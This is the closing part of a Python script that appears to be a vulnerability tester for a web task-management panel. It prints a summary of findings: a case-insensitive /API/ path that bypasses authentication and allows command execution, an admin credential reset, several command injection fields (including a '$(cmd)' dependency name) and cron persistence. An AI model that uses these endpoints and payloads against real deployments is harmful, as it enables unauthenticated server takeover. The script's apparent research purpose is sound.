    log(f"Results: {passed}/{total} passed")

    log("")
    log("KEY FINDINGS:")
    log("  1. Case-insensitive bypass: /API/ skips ALL auth → ONE-STEP RCE")
    log("     PUT /API/system/command-run executes arbitrary commands without auth")
    log("  2. Init Guard Bypass: PUT /open/user/init resets admin credentials")
    log("  3. Dependency injection: POST /API/dependencies [{name:'$(cmd)'}]")
    log("  4. Subscription injection: POST /API/subscriptions {sub_before:'cmd'}")
    log("  5. Mirror injection: PUT /API/system/config/python-mirror")
    log("  6. Persistence RCE: loaders/initData.ts auto-runs matched crons")
    log("CVSS: 9.8 (Critical) — Multiple Unauthenticated RCE vectors")


if __name__ == "__main__":
    main()

